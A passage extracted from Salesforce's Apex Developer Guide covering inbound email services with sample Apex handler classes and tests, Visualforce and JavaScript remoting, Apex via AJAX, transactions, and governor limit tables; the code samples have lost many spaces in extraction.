@c:\test\vehiclephoto1.jpg
"https://MyDomainName.my.salesforce.com/services/apexrest/CaseManagement/v1/500D0000003aCts"
Note:  The cURL examples in this section don’t use a namespaced Apex class so you won’t see the namespace in the URL.
The Apex class returns a JSON response that contains the attachment ID such as the following:
"00PD0000001y7BfMAI"
3.To verify that the attachment and the image were added to the case, navigate to Cases and select the All Open Cases view. Click
on the case and then scroll down to the Attachments related list. You should see the attachment you just created.
Apex Email Service
You can use email services to process the contents, headers, and attachments of inbound email. For example, you can create an email
service that automatically creates contact records based on contact information in messages.
You can associate each email service with one or more Salesforce-generated email addresses to which users can send messages for
processing. To give multiple users access to a single email service, you can:
•
Associate multiple Salesforce-generated email addresses with the email service and allocate those addresses to users.
•
Associate a single Salesforce-generated email address with the email service, and write an Apex class that executes according to the
user accessing the email service. For example, you can write an Apex class that identifies the user based on the user's email address
and creates records on behalf of that user.
To use email services, from Setup, enter EmailServices in the QuickFind box, then select Email Services.
•
Click New Email Service to define a new email service.
•
Select an existing email service to view its configuration, activate or deactivate it, and view or specify addresses for that email service.
•
Click Edit to make changes to an existing email service.
•
Click Delete to delete an email service.
335
Invoking ApexApex Developer Guide

Note:  Before deleting email services, you must delete all associated email service addresses.
When defining email services, note the following:
•
An email service only processes messages it receives at one of its addresses.
•
Salesforce limits the total number of messages that all email services combined, including On-Demand Email-to-Case, can process
daily. Messages that exceed this limit are bounced, discarded, or queued for processing the next day, depending on how you
configure the failure response settings for each email service. Salesforce calculates the limit by multiplying the number of user
licenses by 1,000; maximum 1,000,000. For example, if you have 10 licenses, your org can process up to 10,000 email messages a
day.
•
Email service addresses that you create in your sandbox can’t be copied to your production org.
•
For each email service, you can tell Salesforce to send error email messages to a specified address instead of the sender's email
address.
•
Email services reject email messages and notify the sender if the email (combined body text, body HTML, and attachments) exceeds
approximately 25 MB (varies depending on language and character set).
Using the InboundEmail Object
For every email the Apex email service domain receives, Salesforce creates a separate InboundEmail object that contains the contents
and attachments of that email. You can use Apex classes that implement the Messaging.InboundEmailHandler interface
to handle an inbound email message. Using the handleInboundEmail method in that class, you can access an InboundEmail
object to retrieve the contents, headers, and attachments of inbound email messages, as well as perform many functions.
Example 1: Create Tasks for Contacts
The following is an example of how you can look up a contact based on the inbound email address and create a new task.
publicwithsharingclassCreateTaskEmailExampleimplementsMessaging.InboundEmailHandler
{
publicMessaging.InboundEmailResulthandleInboundEmail(Messaging.inboundEmailemail,
Messaging.InboundEnvelopeenv){
// Createan InboundEmailResultobjectfor returningthe resultof the
// ApexEmailService
Messaging.InboundEmailResultresult= new Messaging.InboundEmailResult();
StringmyPlainText='';
// Add the emailplaintextintothe localvariable
myPlainText= email.plainTextBody;
// New Taskobjectto be created
Task[]newTask= new Task[0];
// Try to lookup any contactsbasedon the emailfromaddress
// If thereis morethanone contactwiththe sameemailaddress,
// an exceptionwillbe thrownand the catchstatementwillbe called.
try {
ContactvCon= [SELECTId, Name,Email
FROMContact
336
Invoking ApexApex Developer Guide

WHEREEmail= :email.fromAddress
WITHUSER_MODE
LIMIT1];
// Add a new Taskto the contactrecordwe justfoundabove.
newTask.add(new Task(Description=  myPlainText,
Priority= 'Normal',
Status= 'InboundEmail',
Subject= email.subject,
IsReminderSet= true,
ReminderDateTime= System.now()+1,
WhoId=  vCon.Id));
// Insertthe new Task
insertas usernewTask;
System.debug('NewTaskObject:' + newTask);
}
// If an exceptionoccurswhenthe queryaccesses
// the contactrecord,a QueryExceptionis called.
// The exceptionis writtento the Apexdebuglog.
catch(QueryExceptione) {
System.debug('QueryIssue:' + e);
}
// Set the resultto true.No needto sendan emailbackto the user
// withan errormessage
result.success= true;
// Returnthe resultfor the ApexEmailService
returnresult;
}
}
Example 2: Handle Unsubscribe Email
Companies that send marketing email to their customers and prospects must provide a way to let the recipients unsubscribe. The
following is an example of how an email service can process unsubscribe requests. The code searches the subject line of inbound email
for the word “unsubscribe.” If the word is found, the code finds all contacts and leads that match the From email address and sets the
EmailOpt Out field (HasOptedOutOfEmail) to True.
publicwithsharingclassunsubscribeimplementsMessaging.inboundEmailHandler{
publicMessaging.InboundEmailResulthandleInboundEmail(Messaging.InboundEmailemail,
Messaging.InboundEnvelopeenv ) {
// Createan inboundEmailResultobjectfor returning
// the resultof the emailservice.
Messaging.InboundEmailResultresult= new Messaging.InboundEmailResult();
// Createcontactand leadliststo holdall the updatedrecords.
List<Contact>lc = new List<contact>();
List<Lead>ll = new List<lead>();
337
Invoking ApexApex Developer Guide

// Convertthe subjectlineto lowercaseso the programcan matchon lowercase.
StringmySubject= email.subject.toLowerCase();
// The searchstringusedin the subjectline.
Strings = 'unsubscribe';
// Checkthe variableto see if the word"unsubscribe"was foundin the subject
line.
BooleanunsubMe;
// Lookfor the word"unsubcribe"in the subjectline.
// If it is found,returntrue;otherwise,returnfalse.
unsubMe= mySubject.contains(s);
// If unsubscribeis foundin the subjectline,enterthe IF statement.
if (unsubMe== true) {
try {
// Lookup all contactswitha matchingemailaddress.
for (Contactc : [SELECTId, Name,Email,HasOptedOutOfEmail
FROMContact
WHEREEmail= :env.fromAddress
AND hasOptedOutOfEmail= false
WITHUSER_MODE
LIMIT100]){
// Add all the matchingcontactsintothe list.
c.hasOptedOutOfEmail= true;
lc.add(c);
}
// Updateall of the contactrecords.
updateas userlc;
}
catch(System.QueryExceptione) {
System.debug('ContactQueryIssue:' + e);
}
try {
// Lookup all leadsmatchingthe emailaddress.
for (Leadl : [SELECTId, Name,Email,HasOptedOutOfEmail
FROMLead
WHEREEmail= :env.fromAddress
AND isConverted= false
AND hasOptedOutOfEmail= false
WITHUSER_MODE
LIMIT100]){
// Add all the leadsto the list.
l.hasOptedOutOfEmail= true;
ll.add(l);
System.debug('LeadObject:' + l);
338
Invoking ApexApex Developer Guide

}
// Updateall leadrecordsin the query.
updateas userll;
}
catch(System.QueryExceptione) {
System.debug('LeadQueryIssue:' + e);
}
System.debug('Foundthe unsubscribewordin the subjectline.');
}
else{
System.debug('No Unsuscribewordfoundin the subjectline.');
}
// ReturnTrueand exit.
// Trueconfirmsprogramis completeand no emails
// shouldbe sentto the senderof the unsubscriberequest.
result.success= true;
returnresult;
}
}
@isTest
privateclassunsubscribeTest{
// The followingtestmethodsprovideadequatecodecoverage
// for the unsubscribeemailclass.
// Thereare two methods,one thatdoesthe testing
// witha valid"unsubcribe"in the subjectline
// and one the doesnot contain"unsubscribe"in the
// subjectline.
statictestMethodvoidtestUnsubscribe(){
// Createa new emailand envelopeobject.
Messaging.InboundEmailemail= new Messaging.InboundEmail();
Messaging.InboundEnvelopeenv= new Messaging.InboundEnvelope();
// Createa new testleadand insertit in the testmethod.
Leadl = new lead(firstName='John',
lastName='Smith',
Company='Salesforce',
Email='user@acme.com',
HasOptedOutOfEmail=false);
insertl;
// Createa new testcontactand insertit in the testmethod.
Contactc = new Contact(firstName='john',
lastName='smith',
Email='user@acme.com',
HasOptedOutOfEmail=false);
insertc;
// Testwiththe subjectthatmatchesthe unsubscribestatement.
email.subject= 'testunsubscribetest';
env.fromAddress= 'user@acme.com';
339
Invoking ApexApex Developer Guide

// Callthe classand testit withthe datain the testMethod.
unsubscribeunsubscribeObj= new unsubscribe();
unsubscribeObj.handleInboundEmail(email,env );
}
statictestMethodvoidtestUnsubscribe2(){
// Createa new emailand envelopeobject.
Messaging.InboundEmailemail= new Messaging.InboundEmail();
Messaging.InboundEnvelopeenv = new Messaging.InboundEnvelope();
// Createa new testleadand insertit in the testmethod.
Leadl = new lead(firstName='john',
lastName='smith',
Company='Salesforce',
Email='user@acme.com',
HasOptedOutOfEmail=false);
insertl;
// Createa new testcontactand insertit in the testmethod.
Contactc = new Contact(firstName='john',
lastName='smith',
Email='user@acme.com',
HasOptedOutOfEmail=false);
insertc;
// Testwitha subjectthatdoesnot contain"unsubscribe."
email.subject= 'test';
env.fromAddress= 'user@acme.com';
// Callthe classand testit withthe datain the testmethod.
unsubscribeunsubscribeObj= new unsubscribe();
unsubscribeObj.handleInboundEmail(email,env );
// Assertthatthe Leadand Contacthavebeenunsubscribed
LeadupdatedLead= [SelectId, HasOptedOutOfEmailfromLeadwhereId = :l.Id];
ContactupdatedContact= [SelectId, HasOptedOutOfEmailfromContactwhereId =
:c.Id];
Assert.isTrue(l.HasOptedOutOfEmail);
Assert.isTrue(c.HasOptedOutOfEmail);
}
}
SEE ALSO:
Apex Reference Guide: InboundEmail Class
Apex Reference Guide: InboundEnvelope Class
Apex Reference Guide: InboundEmailResult Class
340
Invoking ApexApex Developer Guide

Visualforce Classes
In addition to giving developers the ability to add business logic to Salesforce system events such as button clicks and related record
updates, Apex can also be used to provide custom logic for Visualforce pages through custom Visualforce controllers and controller
extensions.
•
A custom controller is a class written in Apex that implements all of a page's logic, without leveraging a standard controller. If you
use a custom controller, you can define new navigation elements or behaviors, but you must also reimplement any functionality
that was already provided in a standard controller.
Like other Apex classes, custom controllers execute entirely in system mode, in which the object and field-level permissions of the
current user are ignored. You can specify whether a user can execute methods in a custom controller based on the user's profile.
•
A controller extension is a class written in Apex that adds to or overrides behavior in a standard or custom controller. Extensions
allow you to leverage the functionality of another controller while adding your own custom logic.
Because standard controllers execute in user mode, in which the permissions, field-level security, and sharing rules of the current
user are enforced, extending a standard controller allows you to build a Visualforce page that respects user permissions. Although
the extension class executes in system mode, the standard controller executes in user mode. As with custom controllers, you can
specify whether a user can execute methods in a controller extension based on the user's profile.
You can use these system-supplied Apex classes when building custom Visualforce controllers and controller extensions.
•
Action
•
Dynamic Component
•
IdeaStandardController
•
IdeaStandardSetController
•
KnowledgeArticleVersionStandardController
•
Message
•
PageReference
•
SelectOption
•
StandardController
•
StandardSetController
In addition to these classes, the transient keyword can be used when declaring methods in controllers and controller extensions.
For more information, see Using the transient Keyword on page 88.
For more information on Visualforce, see the Visualforce Developer's Guide.
JavaScript Remoting
Use JavaScript remoting in Visualforce to call methods in Apex controllers from JavaScript. Create pages with complex, dynamic behavior
that isn’t possible with the standard Visualforce AJAX components.
Features implemented using JavaScript remoting require three elements:
•
The remote method invocation you add to the Visualforce page, written in JavaScript.
•
The remote method definition in your Apex controller class. This method definition is written in Apex, but there are some important
differences from normal action methods.
•
The response handler callback function you add to or include in your Visualforce page, written in JavaScript.
341
Invoking ApexApex Developer Guide

In your controller, your Apex method declaration is preceded with the @RemoteAction annotation like this:
@RemoteAction
globalstaticStringgetItemId(StringobjectName){ ... }
Apex @RemoteAction methods must be static and either global or public.
Add the Apex class as a custom controller or a controller extension to your page.
<apex:pagecontroller="MyController"extension="MyExtension">
Warning:  Adding a controller or controller extension grants access to all @RemoteAction methods in that Apex class, even
if those methods aren’t used in the page. Anyone who can view the page can execute all @RemoteAction methods and
provide fake or malicious data to the controller.
Then, add the request as a JavaScript function call. A simple JavaScript remoting invocation takes the following form.
[namespace.]MyController.method(
[parameters...,]
callbackFunction,
[configuration]
);
Table 7: Remote Request Elements
DescriptionElement
The namespace of the controller class. The namespace element is required if your organization has
a namespace defined, or if the class comes from an installed package.
namespace
The name of your Apex controller or extension.MyController,
MyExtension
The name of the Apex method you’re calling.method
A comma-separated list of parameters that your method takes.parameters
The name of the JavaScript function that handles the response from the controller. You can also
declare an anonymous function inline. callbackFunction receives the status of the method
call and the result as parameters.
callbackFunction
Configures the handling of the remote call and response. Use this element to change the behavior
of a remoting call, such as whether or not to escape the Apex method’s response.
configuration
For more information, see JavaScript Remoting for Apex Controllers in the Visualforce Developer's Guide.
Apex in AJAX
The AJAX toolkit includes built-in support for invoking Apex through anonymous blocks or public webservice methods.
To invoke Apex through anonymous blocks or public webservice methods, include the following lines in your AJAX code:
<scriptsrc="/soap/ajax/65.0/connection.js" type="text/javascript"></script>
<scriptsrc="/soap/ajax/65.0/apex.js" type="text/javascript"></script>
Note:  For AJAX buttons, use the alternate forms of these includes.
342
Invoking ApexApex Developer Guide

To invoke Apex, use one of the following two methods:
•
Execute anonymously via sforce.apex.executeAnonymous(script). This method returns a result similar to the API's
result type, but as a JavaScript structure.
•
Use a class WSDL. For example, you can call the following Apex class:
globalclassmyClass{
webservicestaticId makeContact(StringlastName,Accounta) {
Contactc = new Contact(LastName= lastName,AccountId= a.Id);
returnc.id;
}
}
By using the following JavaScript code:
var account= sforce.sObject("Account");
var id = sforce.apex.execute("myClass","makeContact",
{lastName:"Smith",
a:account});
The execute method takes primitive data types, sObjects, and lists of primitives or sObjects.
To call a webservice method with no parameters, use {} as the third parameter for sforce.apex.execute. For example, to
call the following Apex class:
globalclassmyClass{
webservicestaticStringgetContextUserName(){
returnUserInfo.getFirstName();
}
}
Use the following JavaScript code:
var contextUser= sforce.apex.execute("myClass", "getContextUserName", {});
Note:  If a namespace has been defined for your organization, you must include it in the JavaScript code when you invoke
the class. For example, to call the myClass class, the JavaScript code from above would be rewritten as follows:
var contextUser= sforce.apex.execute("myNamespace.myClass", "getContextUserName",
{});
To verify whether your organization has a namespace, log in to your Salesforce organization and from Setup, enter Packages
in the QuickFind box, then select Packages. If a namespace is defined, it’s listed under Developer Settings.
For more information on the return datatypes, see Data Types in AJAX Toolkit
Use the following line to display a window with debugging information:
sforce.debug.trace=true;
Apex Transactions and Governor Limits
Apex Transactions ensure the integrity of data. Apex code runs as part of atomic transactions. Governor execution limits ensure the
efficient use of resources on the Lightning Platform multitenant platform.
Most of the governor limits are per transaction, and some aren’t, such as 24-hour limits.
343
Apex Transactions and Governor LimitsApex Developer Guide

To make sure Apex adheres to governor limits, certain design patterns should be used, such as bulk calls and foreign key relationships
in queries.
Apex Transactions
An Apex transaction represents a set of operations that are executed as a single unit. All DML operations in a transaction must complete
successfully. If an error occurs in one operation, the entire transaction is rolled back and no data is committed to the database. The
boundary of a transaction can be a trigger, a class method, an anonymous block of code, a Visualforce page, or a custom Web service
method.
Execution Governors and Limits
Because Apex runs in a multitenant environment, the Apex runtime engine strictly enforces limits so that runaway Apex code or
processes don’t monopolize shared resources. If some Apex code exceeds a limit, the associated governor issues a runtime exception
that can’t be handled.
Set Up Governor Limit Email Warnings
You can specify users in your organization to receive an email notification when they invoke Apex code that surpasses 50% of
allocated governor limits. Only per-request limits are checked for sending email warnings; per-org limits like concurrent long-running
requests are not checked. These email notifications do not count against the daily single email limit.
Running Apex within Governor Execution Limits
When you develop software in a multitenant cloud environment such as the Lightning platform, you don’t have to scale your code,
because the Lightning platform does it for you. Because resources are shared in a multitenant platform, the Apex runtime engine
enforces some limits to ensure that no one transaction monopolizes shared resources.
Apex Transactions
An Apex transaction represents a set of operations that are executed as a single unit. All DML operations in a transaction must complete
successfully. If an error occurs in one operation, the entire transaction is rolled back and no data is committed to the database. The
boundary of a transaction can be a trigger, a class method, an anonymous block of code, a Visualforce page, or a custom Web service
method.
Note:  Payments transactions are the exception to DML operation errors. Even if an error occurs, data is committed and payment
records are generated because the transaction has already happened at the payment gateway.
All operations that occur inside the transaction boundary represent a single unit of operations, including calls to external code, such as
classes or triggers that run in the transaction boundary. For example: a custom Apex Web service method causes a trigger to fire, which
in turn calls a method in a class. In this case, all changes are committed to the database only after all operations in the transaction finish
executing and don’t cause any errors. If an error occurs in any of the intermediate steps, all database changes are rolled back and the
transaction isn’t committed.
An Apex transaction is sometimes referred to as an execution context. This guide uses the term Apex transaction.
How are Transactions Useful?
Transactions are useful when several operations are related, and either all or none of the operations are committed. The goal is to keep
the database in a consistent state. There are many business scenarios that benefit from transaction processing. For example, transferring
funds from one bank account to another is a common scenario. It involves debiting the first account and crediting the second account
with the amount to transfer. These two operations must be committed together to the database. If the debit operation succeeds and
the credit operation fails, the account balances become inconsistent.
344
Apex Transactions and Governor LimitsApex Developer Guide

Example
This example shows how all DML insert operations in a method are rolled back when the last operation causes a validation rule
failure. In this example, the invoice method is the transaction boundary—all code that runs within this method either commits all
changes to the platform database or rolls back all changes. In this case, we add an invoice statement with a line item for the pencils
merchandise. The Line Item is for a purchase of 5,000 pencils specified in the Units_Sold__c field, which is more than the entire pencils
inventory of 1,000. This example assumes a validation rule has been set up to check that the total inventory of the merchandise item is
enough to cover new purchases.
Since this example attempts to purchase more pencils (5,000) than items in stock (1,000), the validation rule fails and throws an exception.
Code execution halts at this point and all DML operations processed before this exception are rolled back. The invoice statement and
the line item aren’t added to the database, and their insert DML operations are rolled back.
In the Developer Console, execute the static invoice method.
// Only1,000pencilsare in stock.
// Purchasing5,000pencilscausethe validationruleto fail,
// whichresultsin an exceptionin the invoicemethod.
Id invoice= MerchandiseOperations.invoice('Pencils', 5000,'test1');
This definition is the invoice method. The update of total inventory causes an exception due to the validation rule failure. As a result,
the invoice statements and line items are rolled back and aren’t inserted into the database.
publicclassMerchandiseOperations{
publicstaticId invoice(StringpName,IntegerpSold,StringpDesc){
// Retrievethe pencilssamplemerchandise
Merchandise__cm = [SELECTPrice__c,Total_Inventory__c
FROMMerchandise__cWHEREName= :pNameLIMIT1];
// breakif no merchandiseis found
System.assertNotEquals(null, m);
// Add a new invoice
Invoice_Statement__ci = new Invoice_Statement__c(
Description__c= pDesc);
inserti;
// Add a new lineitemto the invoice
Line_Item__cli = new Line_Item__c(
Name= '1',
Invoice_Statement__c= i.Id,
Merchandise__c= m.Id,
Unit_Price__c= m.Price__c,
Units_Sold__c= pSold);
insertli;
// Updatethe inventoryof the merchandiseitem
m.Total_Inventory__c-= pSold;
// Thiscausesan exceptiondue to the validationrule
// if thereis not enoughinventory.
updatem;
returni.Id;
}
}
345
Apex Transactions and Governor LimitsApex Developer Guide

Execution Governors and Limits
Because Apex runs in a multitenant environment, the Apex runtime engine strictly enforces limits so that runaway Apex code or processes
don’t monopolize shared resources. If some Apex code exceeds a limit, the associated governor issues a runtime exception that can’t
be handled.
The Apex limits, or governors, track, and enforce the statistics outlined in the following tables and sections.
•
Per-Transaction Apex Limits
•
Per-Transaction Certified Managed Package Limits
•
Lightning Platform Apex Limits
•
Static Apex Limits
•
Size-Specific Apex Limits
•
Miscellaneous Apex Limits
In addition to the core Apex governor limits, email limits and push notification limits are also included later in this topic for your
convenience.
Per-Transaction Apex Limits
These limits count for each Apex transaction. For Batch Apex, these limits are reset for each execution of a batch of records in the
execute method.
This table lists limits for synchronous Apex and asynchronous Apex (Batch Apex and future methods) when they’re different. Otherwise,
this table lists only one limit that applies to both synchronous and asynchronous Apex.
Note:
•
Although scheduled Apex is an asynchronous feature, synchronous limits apply to scheduled Apex jobs.
•
For Bulk API and Bulk API 2.0 transactions, the effective limit is the higher of the synchronous and asynchronous limits. For
example, the maximum number of Bulk Apex jobs added to the queue with System.enqueueJob is the synchronous
limit (50), which is higher than the asynchronous limit (1).
Asynchronous
Limit
Synchronous
Limit
Description
200100Total number of SOQL queries issued
1
50,00050,000Total number of records retrieved by SOQL queries
10,00010,000Total number of records retrieved by Database.getQueryLocator
2020Total number of SOSL queries issued
2,0002,000Total number of records retrieved by a single SOSL query
150150Total number of DML statements issued
2
10,00010,000Total number of records processed as a result of DML statements, Approval.process,
or database.emptyRecycleBin
1616Total stack depth for any Apex invocation that recursively fires triggers due to insert,
update, or delete statements
3
100100Total number of callouts (HTTP requests or web services calls) in a transaction
346
Apex Transactions and Governor LimitsApex Developer Guide

Asynchronous
Limit
Synchronous
Limit
Description
120 seconds120 secondsMaximum cumulative timeout for all callouts (HTTP requests or Web services calls) in a
transaction
0 in batch and
future contexts; 50
50Maximum number of methods with the future annotation allowed per Apex invocation
in queueable
context
150Maximum number of Apex jobs added to the queue with System.enqueueJob
1010Total number of sendEmail methods allowed
12 MB6 MBTotal heap size
4
60,000 milliseconds10,000 millisecondsMaximum CPU time on the Salesforce servers
5
10 minutes10 minutesMaximum execution time for each Apex transaction
1010Maximum number of push notification method calls allowed per Apex transaction
2,0002,000Maximum number of push notifications that can be sent in each push notification method
call
150150Maximum number of EventBus.publish calls for platform events configured to
publish immediately
50 million50 millionMaximum number of rows per Apex cursor
10,00010,000Maximum number of Apex cursors per day
1010Maximum number of cursor fetch calls per transaction
100 million100 millionMaximum number of Apex cursor rows fetched per day (aggregate)
1
 In a SOQL query with parent-child relationship subqueries, each parent-child relationship counts as an extra query. These types of
queries have a limit of three times the number for top-level queries. The limit for subqueries corresponds to the value that
Limits.getLimitAggregateQueries() returns. The row counts from these relationship queries contribute to the row
counts of the overall code execution. This limit doesn’t apply to custom metadata types. In a single Apex transaction, custom metadata
records can have unlimited SOQL queries. In addition to static SOQL statements, calls to the following methods count against the number
of SOQL statements issued in a request.
•
Database.countQuery, Database.countQueryWithBinds
•
Database.getQueryLocator, Database.getQueryLocatorWithBinds
•
Database.query, Database.queryWithBinds
2
 Calls to the following methods count against the number of DML statements issued in a request.
•
Approval.process
•
Database.convertLead
•
Database.emptyRecycleBin
•
Database.rollback
•
Database.setSavePoint
347
Apex Transactions and Governor LimitsApex Developer Guide

•
delete and Database.delete
•
insert and Database.insert
•
merge and Database.merge
•
undelete and Database.undelete
•
update and Database.update
•
upsert and Database.upsert
•
EventBus.publish for platform events configured to publish after commit
•
System.runAs
3
 Recursive Apex that doesn’t fire any triggers with insert, update, or delete statements, exists in a single invocation, with a
single stack. Conversely, recursive Apex that fires a trigger spawns the trigger in a new Apex invocation. The new invocation is separate
from the invocation of the code that caused it to fire. Spawning a new invocation of Apex is a more expensive operation than a recursive
call in a single invocation. Therefore, there are tighter restrictions on the stack depth of these types of recursive calls.
4
 Email services heap size is 50 MB.
5
 CPU time is calculated for all executions on the Salesforce application servers occurring in one Apex transaction. CPU time is calculated
for the executing Apex code, and for any processes that are called from this code, such as package code and workflows. CPU time is
private for a transaction and is isolated from other transactions. Application server CPU time spent in DML operations is counted towards
the Apex CPU limit. Operations that don't consume application server CPU time aren't counted toward CPU time. For example, the
portion of execution time spent in the database for DML, SOQL, and SOSL isn't counted, nor is waiting time for Apex callouts. Bulk API
and Bulk API 2.0 consume a unique governor limit for CPU time on Salesforce Servers, with a maximum value of 60,000 milliseconds.
Note:
•
Limits apply individually to each testMethod.
•
To determine the code execution limits for your code while it’s running, use the Limits methods. For example, you can use
the getDMLStatements method to determine the number of DML statements that have already been called by your
program. Or, you can use the getLimitDMLStatements method to determine the total number of DML statements
available to your code.
Per-Transaction Certified Managed Package Limits
Certified managed packages—managed packages that have passed the security review for AppExchange—get their own set of limits
for most per-transaction limits. Salesforce ISV Partners develop certified managed packages, which are installed in your org from
AppExchange and have unique namespaces.
Here’s an example that illustrates the separate certified managed package limits for DML statements. If you install a certified managed
package, all the Apex code in that package gets its own 150 DML statements. These DML statements are in addition to the 150 DML
statements your org’s native code can execute. This limit increase means more than 150 DML statements can execute during a single
transaction if code from the managed package and your native org both executes. Similarly, the certified managed package gets its own
100-SOQL-query limit for synchronous Apex, in addition to the org’s native code limit of 100 SOQL queries.
There’s no limit on the number of certified namespaces that can be invoked in a single transaction. However, the number of operations
that can be performed in each namespace must not exceed the per-transaction limits. There’s also a limit on the cumulative number of
operations that can be made across namespaces in a transaction. This cumulative limit is 11 times the per-namespace limit. For example,
if the per-namespace limit for SOQL queries is 100, a single transaction can perform up to 1,100 SOQL queries. In this case, the cumulative
limit is 11 times the per-namespace limit of 100. These queries can be performed across an unlimited number of namespaces, as long
as any one namespace doesn't have more than 100 queries. The cumulative limit doesn’t affect limits that are shared across all namespaces,
such as the limit on maximum CPU time.
348
Apex Transactions and Governor LimitsApex Developer Guide

Note:
•
These cross-namespace limits apply only to namespaces in certified managed packages.
•
Namespaces in non-certified packages don’t have their own separate governor limits. The resources that they use continue
to count against the same governor limits used by the org's custom code.
This table lists the cumulative cross-namespace limits.
Cumulative
Cross-Namespace Limit
Description
1,100Total number of SOQL queries issued
110,000Total number of records retrieved by Database.getQueryLocator
220Total number of SOSL queries issued
1,650Total number of DML statements issued
1,100Total number of callouts (HTTP requests or web services calls) in a transaction
110Total number of sendEmail methods allowed
All per-transaction limits count separately for certified managed packages except for:
•
The total heap size
•
The maximum CPU time
•
The maximum transaction execution time
•
The maximum number of unique namespaces
These limits count for the entire transaction, regardless of how many certified managed packages are running in the same transaction.
The code from a package from AppExchange, not created by a Salesforce ISV Partner and not certified, doesn’t have its own separate
governor limits. Any resources used by the package count against the total org governor limits. Cumulative resource messages and
warning emails are also generated based on managed package namespaces.
For more information on Salesforce ISV Partner packages, see Salesforce Partner Programs.
Lightning Platform Apex Limits
The limits in this table aren't specific to an Apex transaction; Lightning Platform enforces these limits.
LimitDescription
250,000 or the number of user
licenses in your org multiplied
by 200, whichever is greater
The maximum number of asynchronous Apex method executions (batch Apex, future methods,
Queueable Apex, and scheduled Apex) per a 24-hour period
1,6,7
Based on the number of
applicable licenses
8
 in an org,
Number of synchronous concurrent transactions for long-running transactions that last longer than
5 seconds for each org.
2
the limit is calculated as a ratio
of 100 licenses to one
concurrent long-running Apex
transaction
9
.
349
Apex Transactions and Governor LimitsApex Developer Guide

LimitDescription
•
Minimum limit is 10
•
Maximum limit is 50
100. In Developer Edition orgs,
the limit is 5.
Maximum number of Apex classes scheduled concurrently
100Maximum number of batch Apex jobs in the Apex flex queue that are in Holding status
5Maximum number of batch Apex jobs queued or active concurrently
3
1Maximum number of batch Apex job start method concurrent executions
4
5Maximum number of batch jobs that can be submitted in a running test
The greater of 500 or 10
multiplied by the number of test
classes in the org
Maximum number of test classes that can be queued per 24-hour period (production orgs other
than Developer Edition)
5,6
The greater of 500 or 20
multiplied by the number of test
classes in the org
Maximum number of test classes that can be queued per 24-hour period (sandbox and Developer
Edition orgs)
5,6
1
 For Batch Apex, method executions include executions of the start, execute, and finish methods. This limit is for your entire
org and is shared with all asynchronous Apex: Batch Apex, Queueable Apex, scheduled Apex, and future methods. The license types
that count toward this limit include full Salesforce and Salesforce Platform user licenses, App Subscription user licenses, Chatter Only
users, Identity users, and Company Communities users.
2
 If more transactions are started while the default number of long-running transactions are still running, they’re denied. HTTP callout
processing time isn’t included when calculating this limit.
3
 When batch jobs are submitted, they’re held in the flex queue before the system queues them for processing.
4
 Batch jobs that haven’t started yet remain in the queue until they’re started. If more than one job is running, this limit doesn’t cause
any batch job to fail.execute methods of batch Apex jobs still run in parallel.
5
 This limit applies to tests running asynchronously. This group of tests includes tests started through the Salesforce user interface
including the Developer Console or by inserting ApexTestQueueItem objects using SOAP API.
6
 To check how many asynchronous Apex executions are available, make a request to REST API limits resource or use Apex methods
OrgLimits.getAll() or OrgLimits.getMap(). See List Organization Limits in the REST API Developer Guide and OrgLimits
Class in the Apex Reference Guide.
7
 If the number of asynchronous Apex executions needed by a job exceeds the available number that’s calculated using the 24-hour
rolling limit, an exception is thrown. Batch Apex preemptively checks the required asynchronous job capacity when
Database.executeBatch is called and the start method has returned the workload. The batch won’t start unless there is
sufficient capacity for the entire job available. For example, if the batch requires 10,000 executions and the remaining asynchronous
limit is 9,500 executions, an AsyncApexExecutionsLimitexceeded exception is thrown, and the remaining executions
are left unchanged.
8
 The license types that count toward this limit include full Salesforce and Salesforce Platform user licenses, App Subscription user licenses,
Chatter Only users, Identity users, and Company Communities users.
350
Apex Transactions and Governor LimitsApex Developer Guide

9
 For example, if your org has 4,000 licenses, the concurrent long-running Apex requests limit is set at 40. If your org has 5,000 or more
licenses, the concurrent long-running Apex requests limit is set at 50, which is the maximum capped limit. If your org has 1,000 or fewer
licenses, the concurrent long-running Apex requests limit is set at 10, which is the minimum floor limit.
Static Apex Limits
LimitDescription
10 secondsDefault timeout of callouts (HTTP requests or Web services calls) in a transaction
6 MB for synchronous Apex or
12 MB for asynchronous Apex
Maximum size of callout request or response (HTTP request or Web services call)
1
120 secondsMaximum SOQL query run time before Salesforce cancels the transaction
7500Maximum number of class and trigger code units in a deployment of Apex
200Apex trigger batch size
2
200For loop list batch size
50 millionMaximum number of records returned for a Batch Apex query in Database.QueryLocator
1
The HTTP request and response sizes count towards the total heap size.
2
The Apex trigger batch size for platform events and Change Data Capture events is 2,000. The trigger batch size doesn’t apply when
using Mass Transfer Records.
Size-Specific Apex Limits
LimitDescription
1 millionMaximum number of characters for a class
1 millionMaximum number of characters for a trigger
6 MBMaximum amount of code used by all Apex code in an org
1 ,3 ,4
65,535 bytecode instructions in
compiled form
Method size limit
2
1
 This limit doesn’t apply to Apex code in first generation(1GP) or second generation(2GP) managed packages. The code in those types
of packages belongs to a namespace unique from the code in your org. This limit also doesn’t apply to any code included in a class
defined with the @isTest annotation.
2
 Large methods that exceed the allowed limit cause an exception to be thrown during the execution of your code.
3
 The default 6 MB limit can be increased by opening a support case for your org. Before you apply for a limit increase, ensure that you’re
following best practices outlined in Increase Apex Code Character Limit.
4
 For scratch orgs, the limit is 10MB. The limit can be increased by opening a support case for your org. Before you apply for a limit
increase, ensure that you’re following the best practices.
351
Apex Transactions and Governor LimitsApex Developer Guide

Miscellaneous Apex Limits
Connect in Apex
For classes in the ConnectApi namespace, every write operation costs one DML statement against the Apex governor limit.
ConnectApi method calls are also subject to rate limits. ConnectApi rate limits match Connect REST API rate limits, and
have a per user, per namespace, per hour rate limit. When you exceed the rate limit, a ConnectApi.RateLimitException
is thrown. Your Apex code must catch and handle this exception.
For migrated orgs and orgs created in Summer ’24 and later, only ConnectApi method calls that require Chatter are subject to
the per user, per namespace, per hour rate limit. The documentation for every ConnectApi method indicates whether Chatter
is required. ConnectApi method calls that don’t require Chatter count toward the Salesforce Platform total API request allocations,
which are per org and span a 24-hour period.
Data.com Clean
If you use the Data.com Clean product and its automated jobs, consider how you use Apex triggers. If you have Apex triggers on
account, contact, or lead records that run SOQL queries, the SOQL queries can interfere with Clean jobs for those objects. Your Apex
triggers (combined) must not exceed 200 SOQL queries per batch. If they do, your Clean job for that object fails. In addition, if your
triggers call future methods, they’re subject to a limit of 10 future calls per batch.
Event Reports
The maximum number of records that an event report returns for a user who isn’t a system administrator is 20,000; for system
administrators, 100,000.
MAX_DML_ROWS limit in Apex testing
